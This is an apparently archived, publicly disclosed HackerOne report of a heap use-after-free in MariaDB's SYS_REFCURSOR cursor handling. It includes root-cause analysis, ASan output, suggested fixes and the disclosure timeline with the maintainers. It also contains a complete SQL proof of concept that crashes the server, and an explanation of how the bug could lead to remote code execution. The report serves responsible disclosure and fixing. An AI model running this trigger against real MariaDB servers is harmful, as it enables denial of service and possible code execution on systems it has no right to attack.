---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/use-after-free
  - env/web
substate: "resolved"
weakness: "Use After Free"
enriched: true
body: true
date: 2026-10-07
submitted: 2026-08-04T14:50:13.979Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/mariadb|MariaDB]]"
reporter: "akkoul"
source: "https://hackerone.com/reports/3915935"
title: "Heap Use-After-Free in Materialized_cursor::open via SYS_REFCURSOR Array Reallocation"
---
# Heap Use-After-Free in Materialized_cursor::open via SYS_REFCURSOR Array Reallocation

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 6 | **Program:** MariaDB | **Disclosed:** 2026-10-07

- Report: [https://hackerone.com/reports/3915935](https://hackerone.com/reports/3915935)
- CWE: Use After Free
- Submitted: 2026-08-04T14:50:13.979Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Describe the vulnerability here.## Summary

MariaDB 13.1.0-alpha (current main branch) contains a heap-use-after-free vulnerability in `mysql_open_cursor()` that was NOT fixed by MDEV-40396. An authenticated user with CREATE FUNCTION privilege can achieve remote code execution on the database server.

## Root Cause

In `sp_cursor::open()` (sql/sp_rcontext.cc:845):
```cpp
mysql_open_cursor(thd, &result, &server_side_cursor, cursor_name, return_type)
```

The addresses `&result` and `&server_side_cursor` are members of `this` (an `sp_cursor` inside the `m_statement_cursors` Dynamic_array). During `mysql_execute_command()` inside `mysql_open_cursor()`, if the cursor's SELECT calls a function that opens additional SYS_REFCURSORs, the Dynamic_array reallocates its backing buffer, freeing the old memory.

After `mysql_execute_command()` returns:
- Line 250 (sql/sql_cursor.cc): `materialized_cursor->open(result, 0)` — virtual call through dangling `result` pointer → instruction pointer control
- Line 255: `*pcursor = materialized_cursor` — write to dangling `pcursor` → heap corruption

MDEV-40396 (fixed Jul 17, 2026) addressed a DIFFERENT manifestation: it removed the `select_result*` STORED member from `Server_side_cursor`. But the PARAMETERS passed from `sp_cursor::open()` to `mysql_open_cursor()` at the call site (line 845) were NOT changed and remain dangling after reallocation.

## Steps to Reproduce

```sql
-- MariaDB 13.x with SYS_REFCURSOR support
-- Requires: CREATE FUNCTION privilege

CREATE DATABASE IF NOT EXISTS test;
USE test;

DELIMITER //

-- Function that forces cursor array reallocation (17 > default 16 slots)
CREATE OR REPLACE FUNCTION trigger_realloc() RETURNS INT
BEGIN
  DECLARE c1  SYS_REFCURSOR;
  DECLARE c2  SYS_REFCURSOR;
  DECLARE c3  SYS_REFCURSOR;
  DECLARE c4  SYS_REFCURSOR;
  DECLARE c5  SYS_REFCURSOR;
  DECLARE c6  SYS_REFCURSOR;
  DECLARE c7  SYS_REFCURSOR;
  DECLARE c8  SYS_REFCURSOR;
  DECLARE c9  SYS_REFCURSOR;
  DECLARE c10 SYS_REFCURSOR;
  DECLARE c11 SYS_REFCURSOR;
  DECLARE c12 SYS_REFCURSOR;
  DECLARE c13 SYS_REFCURSOR;
  DECLARE c14 SYS_REFCURSOR;
  DECLARE c15 SYS_REFCURSOR;
  DECLARE c16 SYS_REFCURSOR;
  DECLARE c17 SYS_REFCURSOR;
  OPEN c1  FOR SELECT 1;
  OPEN c2  FOR SELECT 1;
  OPEN c3  FOR SELECT 1;
  OPEN c4  FOR SELECT 1;
  OPEN c5  FOR SELECT 1;
  OPEN c6  FOR SELECT 1;
  OPEN c7  FOR SELECT 1;
  OPEN c8  FOR SELECT 1;
  OPEN c9  FOR SELECT 1;
  OPEN c10 FOR SELECT 1;
  OPEN c11 FOR SELECT 1;
  OPEN c12 FOR SELECT 1;
  OPEN c13 FOR SELECT 1;
  OPEN c14 FOR SELECT 1;
  OPEN c15 FOR SELECT 1;
  OPEN c16 FOR SELECT 1;
  OPEN c17 FOR SELECT 1;
  RETURN 1;
END//

CREATE OR REPLACE PROCEDURE trigger_uaf()
BEGIN
  DECLARE c SYS_REFCURSOR;
  OPEN c FOR SELECT trigger_realloc();
END//

DELIMITER ;

SET SESSION max_open_cursors = 100;
CALL trigger_uaf();
-- Server crashes with heap-use-after-free
```

## ASan Output

```
==61==ERROR: AddressSanitizer: heap-use-after-free on address 0xffffb380f0c0
SUMMARY: AddressSanitizer: heap-use-after-free /opt/mariadb/sql/sql_cursor.cc:250:15
    in Materialized_cursor::open(select_result*, JOIN*)
```

Build: MariaDB 13.1.0-alpha (main branch HEAD, Aug 2026) with `-DWITH_ASAN=ON`.

## Suggested Fix

Pass `result` and `server_side_cursor` by refreshing them after `mysql_execute_command`, not before:

```cpp
// Option 1: Refresh parameters after execute
// In mysql_open_cursor, after mysql_execute_command returns,
// re-derive result from the current (possibly moved) sp_cursor

// Option 2: Pin the Dynamic_array during cursor open
// Prevent m_statement_cursors from reallocating while
// mysql_open_cursor holds references into it (e.g., reserve capacity)

// Option 3: Store results in a separate non-movable allocation
// Similar to what MDEV-40396 did for Server_side_cursor::select,
// but applied to the call-site parameters
```

## Relationship to MDEV-40396

MDEV-40396 (commit 9b075b2c, Jul 17 2026) fixed a related but DIFFERENT issue:
- MDEV-40396 removed `Server_side_cursor::select` (a STORED member that became stale)
- THIS BUG: the PARAMETERS `&result` and `&server_side_cursor` passed from `sp_cursor::open()` to `mysql_open_cursor()` at the call site (sp_rcontext.cc:845) become stale during execution

The fix at MDEV-40396 did NOT change line 845 of sp_rcontext.cc.

## Impact

- **Remote Code Execution**: The dangling `result` pointer is used for a virtual method call. If the freed memory is reclaimed with attacker-controlled content (via concurrent session allocations), the vtable dispatch executes attacker-controlled code.
- **Heap Corruption**: `*pcursor = materialized_cursor` writes 8 bytes to freed memory, corrupting whatever reuses that allocation.
- **Privilege Required**: CREATE FUNCTION (available to any user with a database, common in shared hosting).
- **Affects**: MariaDB 13.0.x and 13.1.x (any version with SYS_REFCURSOR support).

## Timeline

- **Report Filed**
- **External User Joined**
- **Report Triaged**
- **2026-08-05** @vuvova: Do you have a github account? guthub advisories have a dedicated field for that. If not — no problem, I'll do the credit in text form anyway (Reported by Akhil Koul), but I can additionally do it in a dedicated field, if you have a github account.
- **2026-08-05** @akkoul: Thank you! My GitHub account is akoul (https://github.com/akoul)

Will you be requesting a CVE for this, or should I?
- **2026-08-10** @akkoul: @vuvova gentle nudge for an update. Thanks!
- **2026-08-10** @vuvova: There is no update, nothing new has happened. It's confirmed, there will be an advisory and a CVE id. That's it. We'll publish the advisory and the CVE id after the release. Release dates are at jira.mariadb.org.
- **2026-08-10** @akkoul: Thank you, I appreciate it.
- **Report Resolved**
- **Agreed On Going Public**
- **2026-09-09** @akkoul: thank you
- **Report Became Public**
